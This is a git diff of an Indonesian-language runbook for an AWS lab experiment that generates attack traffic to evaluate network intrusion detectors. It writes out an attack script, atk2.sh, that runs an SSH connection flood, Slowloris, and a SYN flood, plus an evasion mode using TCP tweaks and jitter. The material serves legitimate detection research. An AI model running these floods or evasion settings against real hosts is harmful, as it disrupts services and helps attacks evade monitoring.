@@ -7,6 +7,44 @@
 
 ---
 
+## PELAJARAN dari eksekusi pertama (WAJIB dibaca — pakai pola Paper 1, jangan coba yang baru)
+
+Eksekusi pertama sempat gagal karena mengabaikan pengalaman Paper 1. Berikut akar
+masalah + solusi yang SUDAH TERBUKTI. Ikuti ini agar tidak terulang.
+
+1. **AWS CLI di instance RUSAK setelah `pip install`.** UserData menjalankan
+   `pip install nfstream xgboost ... numpy pandas`, yang meng-upgrade paket sistem dan
+   membuat awscli bawaan AL2023 error (`ModuleNotFoundError: No module named 'dateutil'`).
+   Akibatnya `aws s3 cp` GAGAL total.
+   - **Solusi (dipakai):** JANGAN pakai `aws s3 cp` di instance. Unduh model+skrip pakai
+     **boto3** langsung (Python). Boto3 tak terpengaruh kerusakan awscli. Perlu
+     `python3 -m pip install boto3` dulu. (Snippet boto3 ada di Bagian 3 di bawah.)
+
+2. **Tool serangan hydra/sshpass TIDAK ADA di AL2023.** `dnf install hydra` gagal
+   (bukan di repo). Attacker AL2023 hanya punya: `nping` (nmap), `ncat` (nmap-ncat),
+   `ab` (httpd-tools), `slowloris` (pip), `curl`. TIDAK ada hydra/sshpass.
+   - **Solusi (dipakai):** fase SSH brute-force pakai **loop `ncat` ke port 22** sebagai
+     proxy trafik (bukan hydra). Skrip serangan final yang terbukti = `atk2.sh` (lihat
+     Bagian 4). Fase lain (Slowloris, SYN flood via nping, HTTP via curl) jalan normal.
+
+3. **`tcpdump -i any` DILARANG** (0 flow di NFStream). Selalu iface spesifik: `ens5`.
+   Deteksi otomatis: `IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)`.
+
+4. **Serangan lama** (fase Slowloris menahan koneksi) bisa membuat SSM command
+   `InProgress` melebihi 7 menit. Set `--timeout-seconds 900`. Stop capture boleh setelah
+   serangan hampir selesai; pcap sudah berisi mayoritas trafik.
+
+5. **Hasil eksekusi pertama (varian clean, VALID):** 4789 flow (4167 attack, 622 benign).
+   MCC clean: baseline -0,02 | fewshot -0,07 | adv -0,02 | fewshot\_adv 0,00. Semua model
+   runtuh zero-shot di AWS (MCC~0) — KONSISTEN temuan Paper 1 (perlu kalibrasi few-shot AWS).
+   Tersimpan: `s3://.../unsw-far/paper2_aws/detect_clean_advmetrics.json`.
+
+> **Prinsip:** pakai pola operasional Paper 1 yang sudah terbukti (boto3 untuk unduh,
+> tool yang tersedia di AL2023, iface spesifik). Jangan mengulang eksperimen tool baru
+> yang belum tentu ada di lingkungan.
+
+---
+
 ## 0. Arsitektur
 
 - **VPC** `10.6.0.0/16` (beda dari Paper 1 `10.5.0.0/16` agar bisa jalan berdampingan).
@@ -58,23 +96,61 @@ aws cloudformation describe-stacks --stack-name adv-far-ec2 --region ap-southeas
 
 ---
 
-## 3. Siapkan node (via SSM)
+## 3. Siapkan node (via SSM) — PAKAI boto3, BUKAN `aws s3 cp` (lihat Pelajaran #1)
 
-**Target+Analyzer** — unduh model + skrip:
+**Target+Analyzer** — unduh model + skrip via boto3 (`sudo su -` dulu):
 ```bash
-# di sesi SSM target-analyzer
-export S3_BUCKET=ssh-detection-features-232032302717
-mkdir -p /opt/adv/{models,captures,results,scripts}
-aws s3 cp s3://$S3_BUCKET/unsw-far/paper2/ /opt/adv/models/ --recursive
-aws s3 cp s3://$S3_BUCKET/unsw-far/scripts-p2/ /opt/adv/scripts/ --recursive
+python3 -m pip install -q boto3
+mkdir -p /opt/adv/{models,scripts,captures,results}
+python3 - <<'PY'
+import os, boto3
+b='ssh-detection-features-232032302717'; s3=boto3.client('s3', region_name='ap-southeast-1')
+def dl(prefix, dest):
+    os.makedirs(dest, exist_ok=True); n=0
+    for page in s3.get_paginator('list_objects_v2').paginate(Bucket=b, Prefix=prefix):
+        for o in page.get('Contents',[]):
+            rel=o['Key'][len(prefix):]
+            if not rel: continue
+            lp=os.path.join(dest, rel); os.makedirs(os.path.dirname(lp), exist_ok=True)
+            s3.download_file(b, o['Key'], lp); n+=1
+    print('downloaded', n, 'from', prefix)
+dl('unsw-far/paper2/', '/opt/adv/models/')
+dl('unsw-far/scripts-p2/', '/opt/adv/scripts/')
+PY
 chmod +x /opt/adv/scripts/*.sh
-# cek: harus ada /opt/adv/models/CIC_to_UNSW/{baseline,fewshot,adv,fewshot_adv}.json + scaler.pkl
+find /opt/adv/models -type f | sort   # cek 8 model + 2 scaler + meta
 ```
 
-**Attacker** — unduh skrip serangan:
+**Attacker** — install tool AL2023 yang tersedia + tulis skrip serangan terbukti `atk2.sh`
+(`sudo su -` dulu):
 ```bash
-aws s3 cp s3://$S3_BUCKET/unsw-far/scripts-p2/adv-attack-scenario.sh /opt/adv/ 
-chmod +x /opt/adv/adv-attack-scenario.sh
+dnf install -y nmap nmap-ncat httpd-tools iproute-tc python3-pip
+python3 -m ensurepip --upgrade 2>/dev/null || true
+python3 -m pip install -q boto3 slowloris
+# skrip serangan terbukti (tool AL2023: ncat/slowloris/nping/ab/curl; TANPA hydra/sshpass)
+cat > /tmp/atk2.sh <<'SH'
+#!/bin/bash
+# Serangan Paper2 AWS. Timeline 7 menit: 0-1 benign|1-3 SSH-brute(ncat)|3-5 Slowloris|5-6 SYN|6-7 benign
+# Usage: atk2.sh <TARGET_IP> [clean|evasion]
+TARGET=$1; VARIANT=${2:-clean}
+IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)
+if [ "$VARIANT" = evasion ]; then
+  sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1 || true
+  sudo tc qdisc add dev "$IFACE" root netem delay 10ms 5ms distribution normal 2>/dev/null || \
+  sudo tc qdisc change dev "$IFACE" root netem delay 10ms 5ms 2>/dev/null || true
+  SLOW=50; SYN_RATE=100; SYN_CNT=6000
+else
+  SLOW=100; SYN_RATE=200; SYN_CNT=12000
+fi
+echo "[$(date +%T)] F0 benign 60s"; for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done
+echo "[$(date +%T)] F1 SSH-brute(ncat) 120s"; timeout 120 bash -c "while true; do (echo x | ncat -w1 $TARGET 22) >/dev/null 2>&1; done" || true
+echo "[$(date +%T)] F2 Slowloris 120s s=$SLOW"; timeout 120 slowloris "$TARGET" -p 80 -s $SLOW 2>&1 | tail -1 || true
+echo "[$(date +%T)] F3 SYN flood 60s r=$SYN_RATE"; sudo timeout 60 nping --tcp --flags SYN --rate $SYN_RATE -p 80 -c $SYN_CNT "$TARGET" 2>&1 | tail -2 || true
+echo "[$(date +%T)] F4 benign 60s"; for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done
+if [ "$VARIANT" = evasion ]; then sudo tc qdisc del dev "$IFACE" root netem 2>/dev/null || true; sudo sysctl -w net.ipv4.tcp_window_scaling=1 >/dev/null 2>&1 || true; fi
+echo "[$(date +%T)] SELESAI $VARIANT"
+SH
+chmod +x /tmp/atk2.sh
 ```
 
 ---
@@ -84,24 +160,32 @@ chmod +x /opt/adv/adv-attack-scenario.sh
 Untuk tiap varian, urutannya: mulai capture di Target → jalankan serangan di
 Attacker → stop capture → infer.
 
-**4.1 Mulai capture (Target+Analyzer):**
+**4.1 Mulai capture (Target+Analyzer):** iface SPESIFIK (bukan `any` — lihat Pelajaran #3).
+PID file dipisah per varian agar stop capture tak salah proses.
 ```bash
 IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)   # biasanya ens5
-sudo tcpdump -i "$IFACE" -w /opt/adv/captures/detect_clean.pcap &      # ganti ke detect_evasion.pcap utk varian evasion
-echo $! > /tmp/tcpdump.pid
+# varian CLEAN:
+sudo tcpdump -i "$IFACE" -w /opt/adv/captures/detect_clean.pcap & echo $! > /tmp/tcpdump_clean.pid
+# --- atau --- varian EVASION:
+sudo tcpdump -i "$IFACE" -w /opt/adv/captures/detect_evasion.pcap & echo $! > /tmp/tcpdump_ev.pid
 ```
 
-**4.2 Jalankan serangan (Attacker):** (TARGET_IP = PrivateIp target-analyzer)
+**4.2 Jalankan serangan (Attacker):** pakai `atk2.sh` yang terbukti (Bagian 3), BUKAN skrip
+lama. Set `--timeout-seconds 900` di SSM (Slowloris menahan koneksi >7 menit — Pelajaran #4).
+TARGET_IP = PrivateIp target-analyzer.
 ```bash
 # varian CLEAN
-/opt/adv/adv-attack-scenario.sh <TARGET_IP> clean
-# --- atau --- varian EVASION (network-level: TCP window + jitter + rate rendah)
-/opt/adv/adv-attack-scenario.sh <TARGET_IP> evasion
+/tmp/atk2.sh <TARGET_IP> clean
+# --- atau --- varian EVASION (network-level: TCP window scaling off + jitter netem + rate rendah)
+/tmp/atk2.sh <TARGET_IP> evasion
 ```
 
 **4.3 Stop capture (Target+Analyzer):**
 ```bash
-sudo kill "$(cat /tmp/tcpdump.pid)"; sleep 2
+# varian CLEAN:
+sudo kill "$(cat /tmp/tcpdump_clean.pid)"; sleep 2
+# --- atau --- varian EVASION:
+sudo kill "$(cat /tmp/tcpdump_ev.pid)"; sleep 2
 ls -lh /opt/adv/captures/
 ```
 
